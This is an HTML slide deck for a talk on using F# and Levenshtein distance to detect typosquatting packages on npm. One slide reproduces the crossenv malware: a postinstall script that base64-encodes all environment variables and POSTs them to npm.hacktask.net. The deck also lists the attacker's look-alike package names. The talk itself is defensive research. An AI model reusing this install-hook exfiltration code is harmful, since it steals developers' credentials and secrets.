<!doctype html>
<html>

<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">

	<title>Hunting typosquatters with F#</title>

	<link rel="stylesheet" href="talk/reveal.js/css/reveal.css">
	<link rel="stylesheet" href="talk/reveal.js/css/theme/black.css">

	<!-- Theme used for syntax highlighting of code -->
	<link rel="stylesheet" href="talk/reveal.js/lib/css/zenburn.css">

	<link rel="stylesheet" href="talk/css/talk.css">

	<!-- Printing and PDF exports -->
	<script>
		var link = document.createElement('link');
		link.rel = 'stylesheet';
		link.type = 'text/css';
		link.href = window.location.search.match(/print-pdf/gi) ? 'talk/reveal.js/css/print/pdf.css' : 'talk/reveal.js/css/print/paper.css';
		document.getElementsByTagName('head')[0].appendChild(link);
	</script>
</head>

<body>
	<div class="reveal">
		<div class="slides">


			<section>
				<h2>Hunting typosquatters
					<br/>with F#</h2>
				<p>Chester Burbidge</p>

				<p>
					<a href="https://twitter.com/burbdude">@burbdude</a>
				</p>

				<p>
					<a href="http://www.chesterburbidge.com/RepoHunt">chesterburbidge.com/RepoHunt</a>
				</p>
			</section>

			<section>
				<h4>Agenda</h4>
				<pre class="center"><code  data-noescape>var talk = {
	
	"sections": [
		
		"me",

		"npm",

		"crossenv attack",

		"hunt",

		"results"

	]

}</code></pre>

			</section>
			<section>
				<section>
					<h4>me</h4>
					<p>Software Engineer at Scott Logic</p>
					<p>'Back end' C#, learning to .js</p>
					<p>F# novice ~200 hours, 2% expert</p>
				</section>
				<section>
					<h4>F#</h4>
					<script src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>

					<div class="">
						<blockquote class="twitter-tweet tw-align-center" data-conversation="none" data-lang="en">
							<p lang="en" dir="ltr">
								<a href="https://twitter.com/hashtag/fsharp?src=hash&amp;ref_src=twsrc%5Etfw">#fsharp</a> is the greatest language in the world, there I said it fight me</p>&mdash; Spencer Schneidenbach üá∫üá∏
							(@schneidenbach)
							<a href="https://twitter.com/schneidenbach/status/954355269194141698?ref_src=twsrc%5Etfw">January 19, 2018</a>
						</blockquote>

						<blockquote class="twitter-tweet tw-align-center" data-lang="en">
							<p lang="en" dir="ltr">
								<a href="https://twitter.com/hashtag/FSharp?src=hash&amp;ref_src=twsrc%5Etfw">#FSharp</a> &quot;the conciseness of Python, strictness of Scala &amp; ecosystem of .Net.&quot; Is that a good summary?</p>&mdash;
							Luke Merrett (@LukeAMerrett)
							<a href="https://twitter.com/LukeAMerrett/status/850003297180188674?ref_src=twsrc%5Etfw">April 6, 2017</a>
						</blockquote>

						<blockquote class="twitter-tweet tw-align-center" data-lang="en">
							<p lang="en" dir="ltr">Kotlin is way better than Java but it‚Äôs still way off
								<a href="https://twitter.com/hashtag/fsharp?src=hash&amp;ref_src=twsrc%5Etfw">#fsharp</a> in terms of sanity preservation.</p>&mdash; Dave Thomas (@7sharp9_exhumed)
							<a href="https://twitter.com/7sharp9_exhumed/status/964189300073132033?ref_src=twsrc%5Etfw">February 15, 2018</a>
						</blockquote>
					</div>
				</section>
			</section>
			<section data-background-image="talk/img/NpmBackground.png" data-state="dimbg">
				<section>
					<h4>npm</h4>
					<div class="fragment">
						<p>node package manager</p>
						<p>JavaScript open source code repository</p>
					</div>
					<div class="fragment">
						<p>accessed through npm cli</p>
						<pre class="center"><code  data-noescape>npm install &lt;package&gt;</code></pre>
					</div>
					<div class="fragment">
						<p>over 580,000 packages</p>
					</div>

				</section>

				<section>
					<h4>npm</h4>
					<p>580,000 packages?!</p>

					<div class="fragment">
						<p>JavaScript base library fairly spartan</p>
						<p>community prefers lots of small modules</p>
					</div>

					<div class="fragment">
						<blockquote class="twitter-tweet tw-align-center" width="550px" data-lang="en">
							<p lang="en" dir="ltr">Drinking game for npm users:
								<br>‚ûÄ Think of a noun
								<br>‚ûÅ npm install &lt;noun&gt;
								<br>‚ûÇ If it installs - drink!</p>&mdash; Sindre Sorhus (@sindresorhus)
							<a href="https://twitter.com/sindresorhus/status/515511151669805056?ref_src=twsrc%5Etfw">September 26, 2014</a>
						</blockquote>
					</div>

				</section>

				<section>
					<h4>npm - package.json</h4>
					<pre class="center"><code  data-noescape> {
	<span class="fragment highlight-current-green">"name": "my-great-package",
	"version": "1.0.0",</span>
	<span class="fragment highlight-current-green">"description": "makes code great again",
	"license": "MIT",
	"author": "chester",</span>
	<span class="fragment highlight-current-green">"dependencies": {
		"dependency1": "1.2.3",
		"dependency2": "2.3.4"
	},</span>
	<span class="fragment highlight-current-green">"scripts": {
		"preinstall": "pre-install.js",
		"install": "make &amp;&amp; make install",
		"postinstall": "post-install.js"
	}</span>
}</code></pre>
					<p> executed at install: preinstall, install, postinstall, prepack, prepublish, prepare</p>
				</section>

				<section>
					lots of dependencies
				</section>

				<section>
					LOTS of dependencies
				</section>

				<section>
					<img src="talk/img/NodeModulesHeavy.png" width="80%" height="80%" />
				</section>

			</section>

			<section data-background-image="talk/img/HotPockets.png" data-state="dimbg">
				<section>
					<h4>npm - pr - node_modules</h4>
					<p>Aug 5, 2016</p>
					<img alt="node_modules" src="talk/img/NodeModulesArticle.PNG" />
				</section>
				<section>
					<p>Express.js</p>
					<p>contains dependency 'yummy' which make http call on install</p>
					<div class="fragment">
						<blockquote class="twitter-tweet tw-align-center" data-lang="en">
							<p lang="en" dir="ltr">Wham! Bam! Hickory Ham!
								<a href="https://twitter.com/hashtag/HotPockets?src=hash&amp;ref_src=twsrc%5Etfw">#HotPockets</a>
								<a href="http://t.co/t7YBz532MO">http://t.co/t7YBz532MO</a>
								<a href="http://t.co/SUkwWANhQl">pic.twitter.com/SUkwWANhQl</a>
							</p>&mdash; Hot Pockets (@hotpockets)
							<a href="https://twitter.com/hotpockets/status/501511389320470528?ref_src=twsrc%5Etfw">August 18, 2014</a>
						</blockquote>
					</div>
				</section>
				<section>
					<p>Ember.js</p>
					<pre class="center"><code  data-noescape>Ember.js
- Glimmer
- - brittanica
- - - brittanica-g</code></pre>
					<p>whole dictionary for one definition</p>
					<pre class="center"><code  data-noescape>{
  "g": {
    "page": 1018,
    "description": "The seventh letter of the US English..."
  },
  ...
  "glimmer": {
    "page": 1172,
    "description": "A faint or wavering light, used pri..."
  },
  ...
}</code></pre>
				</section>
				<section>
					<p>babel</p>
					<div class="fragment">
						<p>claims that picture of tv chef guy fieri in babel-core dependency</p>
						<img src="talk/img/GuyFieri.png" />
					</div>
				</section>
				<section>
					<div class="fragment">
						<img src="talk/img/GuyFieriPullRequestInsert.png" />
					</div>
					<div class="fragment">
						<img src="talk/img/GuyFieriPullRequestRemove.png" />
						<img src="talk/img/GuyFieriPullRequestRemoveComment.png" />
					</div>
				</section>

				<section>
					<h4>npm - pr - passwords</h4>
					<img alt="passwords" src="talk/img/Passwords.png" />
				</section>
			</section>

			<section data-background-image="talk/img/CrossEnvBackground.jpg" data-state="dimbg">
				<section>
					<h4>crossenv attack</h4>

					<blockquote class="twitter-tweet tw-align-center" data-lang="en">
						<p lang="en" dir="ltr">
							<a href="https://twitter.com/kentcdodds?ref_src=twsrc%5Etfw">@kentcdodds</a> Hi Kent, it looks like this npm package is stealing env variables on install, using your cross-env
							package as bait:
							<a href="https://t.co/REsRG8Exsx">pic.twitter.com/REsRG8Exsx</a>
						</p>&mdash; Oscar Bolmsten (@o_cee)
						<a href="https://twitter.com/o_cee/status/892306836199800836?ref_src=twsrc%5Etfw">August 1, 2017</a>
					</blockquote>

				</section>
				<section>
					<p>crossenv - package.json</p>
					<pre><code  data-noescape>{
  <span class="fragment highlight-current-green" >"name": "crossenv"</span>,
  "version": "6.1.1",
  "description": "Run scripts that set and use environment variables across platforms",
  "main": "index.js",
  "scripts": {
    "test": "echo \"Error: no test specified\" ",
    <span class="fragment highlight-current-green" >"postinstall": "node package-setup.js"</span>
  },
  "author": "Kent C. Dodds",
  "license": "ISC",
  "dependencies": {
    <span class="fragment highlight-current-green" >"cross-env": "^5.0.1"</span>
  }
}</code></pre>
				</section>
				<section>
					<p>crossenv - package-setup.js</p>
					<pre><code data-noescape>const http = require('http');
const querystring = require('querystring');
<span class="fragment highlight-current-green" >const env = JSON.stringify(process.env);</span>
<span class="fragment highlight-current-green" >const data = new Buffer(env).toString('base64');
const postData = querystring.stringify({ data });
const options = {
	hostname: 'npm.hacktask.net',
	port: 80,
	path: '/log/',
	method: 'POST',
	headers: {
		'Content-Type': 'application/x-www-form-urlencoded',
		'Content-Length': Buffer.byteLength(postData)
	}
};
const req = http.request(options);
req.write(postData);
req.end();</span>
</code></pre>
				</section>
				<section>
					<h4>other packages</h4>
					<table id="crossenv-table">
						<tr>
							<td>babelcli</td>
							<td>cross-env.js</td>
							<td>crossenv</td>
							<td>d3.js</td>
							<td>fabric-js</td>
						</tr>
						<tr>
							<td>ffmepg</td>
							<td>gruntcli</td>
							<td>http-proxy.js</td>
							<td>jquery.js</td>
							<td>mariadb</td>
						</tr>
						<tr>
							<td>mongose</td>
							<td>mssql-node</td>
							<td>mssql.js</td>
							<td>mysqljs</td>
							<td>node-fabric</td>
						</tr>
						<tr>
							<td>node-opencv</td>
							<td>node-opensl</td>
							<td>node-openssl</td>
							<td>node-sqlite</td>
							<td>node-tkinter</td>
						</tr>
						<tr>
							<td>nodecaffe</td>
							<td>nodefabric</td>
							<td>nodeffmpeg</td>
							<td>nodemailer-js</td>
							<td>nodemailer.js</td>
						</tr>
						<tr>
							<td>nodemssql</td>
							<td>noderequest</td>
							<td>nodesass</td>
							<td>nodesqlite</td>
							<td>opencv.js</td>
						</tr>
						<tr>
							<td>openssl.js</td>
							<td>proxy.js</td>
							<td>shadowsock</td>
							<td>smb</td>
							<td>sqlite.js</td>
						</tr>
						<tr>
							<td>sqliter</td>
							<td>sqlserver</td>
							<td>tkinter</td>
						</tr>
					</table>
				</section>
				<section>
					<h4>crossenv - mitigate?</h4>
					<div class="fragment">
						<blockquote class="twitter-tweet tw-align-center" data-conversation="none" data-lang="en">
							<p lang="en" dir="ltr">would be super useful if
								<a href="https://twitter.com/npmjs?ref_src=twsrc%5Etfw">@npmjs</a> would deny publishing a package if another one with a
								<a href="https://twitter.com/hashtag/levenshtein?src=hash&amp;ref_src=twsrc%5Etfw">#levenshtein</a> distance &lt;3 is already published !!!</p>&mdash; Andrei Neculau (@andreineculau)
							<a href="https://twitter.com/andreineculau/status/892490804756983808?ref_src=twsrc%5Etfw">August 1, 2017</a>
						</blockquote>
					</div>
					<p class="fragment">Levenshtein distance validation, reject package names of distance &lt; 3 to another package?</p>

				</section>

				<section>
					<h4>Levenshtein distance</h4>
					<p>measure of the similarity between two strings, it is the number of deletions, insertions, or substitutions required
						to transform one string into another</p>
					<p>test -> tent = 1 substitution</p>
					<p>test -> rent = 2 substitutions</p>
					<p>test -> tests = 1 insertion</p>
					<p>test -> tested = 2 insertions</p>
				</section>

				<section>
					<h4>hacktask packages</h4>
					<p>crossenv -> cross-env - dist = 1</p>
					<p>babelcli -> babel-cli - dist = 1</p>
					<p>ffmepg -> ffmpeg - dist = 2</p>
					<p>mysqljs -> mysql - dist = 2</p>
					<p>d3.js -> d3 - dist = 3</p>
				</section>

			</section>

			<section>
				<section>
					<p>search npm for existing typosquatters</p>
					<p>low distance pairs of names
						<br/>crossenv and cross-env
						<br/> typosquatting?</p>
					<p>find low distances, aggregate by author</p>
					<p>determine efficacy of name validation</p>
					<p>over 580,000 packages ~ 1.7 E11 combinations</p>
				</section>

			</section>

			<section data-background-image="talk/img/CouchDb.png" data-state="dimbg">
				<section>
					<h4>data</h4>
					<p>npmjs.com data stored in CouchDB database</p>
					<ul>
						<li>metadata - https://skimdb.npmjs.com/</li>
						<li>all - https://fullfatdb.npmjs.com/</li>
					</ul>
					<p>CouchDB easy to locally replicate</p>
					<pre class="center"><code  data-noescape># create the database
curl -X PUT http://localhost:5984/registry
# replicate
curl -d '{"source":"https://skimdb.npmjs.com/registry", "target":"registry"}' \
	-H "Content-Type: application/json" \
	-X POST http://localhost:5984/_replicate</code></pre>
				</section>

				<section>
					<p>key-value store, package name is key</p>
					<p>value is JSON object:</p>
					<pre class="center"><code  data-noescape>{
  "_id": "d3fc",
  <span class="fragment highlight-current-green">"name": "d3fc"</span>,
  "time": { "13.1.1": "2017-10-16T16:20:51.718Z"},
  "maintainers": [ 
    <span class="fragment highlight-current-green">{ "name": "chrisprice" }, 
    { "name": "colineberhardt" }</span>
  ],
  "dist-tags": { "latest": "13.1.1" },
  "versions": {
    "13.1.1": {
      "name": "d3fc",
      "the rest of the": "package.json ..."
    }
  }
}</code></pre>
				</section>

				<section>
					<p>To query CouchDB need to write View</p>
					<p>JavaScript function(s) map (and reduce)</p>
					<pre class="center"><code data-noescape>function(doc) {
  var authors = []; // todo get the authors
  emit(doc._id, authors);
}</code></pre>
					<p>returns JSON</p>
					<pre class="center"><code data-noescape>{
  "rows": [ 
    { "id": "d3fc", 
      "key": "d3fc", 
      "value": [ "chrisprice", "colineberhardt" ]}
  ]
}</code></pre>
				</section>
			</section>

			<section>
				<h4>hunt</h4>
				<ul>
					<li>find Levenshtein distance algorithm</li>
					<li>reduce search space
						<ul>
							<li>choose max distance - 3</li>
							<li>filter names by length - no need to compare react and react-geocoder-autocomplete</li>
						</ul>
					</li>
					<li>run pairs in parallel, save distance &lt; 4</li>
				</ul>
			</section>
			<section>
				<section>
					<h4>F# async</h4>
					<p>can use standard .NET classes:
						<ul>
							<li>Thread</li>
							<li>AutoResetEvent</li>
							<li>BackgroundWorker</li>
							<li>IAsyncResult</li>
						</ul>
					</p>
					<p>Task Parallel Library</p>
					<p>F# features:
						<ul>
							<li>asynchronous workflows</li>
							<li>messages and agents</li>
						</ul>
					</p>
				</section>

				<section>
					<h4>asynchronous workflows</h4>
					<p>object which encapsulates background task</p>
					<p>Async&lt;t&gt; class that wraps block</p>
					<img src="talk/img/AsyncParallelTypes.png" height="80%" width="80%" />
				</section>

				<section>
					<video src="talk/img/AsyncFSharp.mp4" controls>Browser says no</video>
				</section>

				<section>
					<p>implemented processing with workflows</p>
					<p>wrote subset of combinations to disk</p>
					<p>slow, take weeks to run</p>
					<p>found article optimising calculation using Trie</p>
					<p>implement algorithm in C#, closer to article language</p>
					<p>build Trie data structure, run algorithm against each word</p>
					<p>use agents for parallelism</p>
				</section>
			</section>

			<section>
				
				<section>
					<h4>messages and agents</h4>

					<p>create actors, communicate via messages</p>
					<p>processes typed messages one by one from inbox</p>
					
				</section>

			</section>
		</div>
	</div>

	<script src="talk/reveal.js/lib/js/head.min.js"></script>
	<script src="talk/reveal.js/js/reveal.js"></script>

	<script>
		// More info about config & dependencies:
		// - https://github.com/hakimel/reveal.js#configuration
		// - https://github.com/hakimel/reveal.js#dependencies
		Reveal.initialize({
			dependencies: [
				{ src: 'talk/reveal.js/plugin/markdown/marked.js' },
				{ src: 'talk/reveal.js/plugin/markdown/markdown.js' },
				{ src: 'talk/reveal.js/plugin/notes/notes.js', async: true },
				{ src: 'talk/reveal.js/plugin/highlight/highlight.js', async: true, callback: function () { hljs.initHighlightingOnLoad(); } }
			]
		});
	</script>
</body>

</html>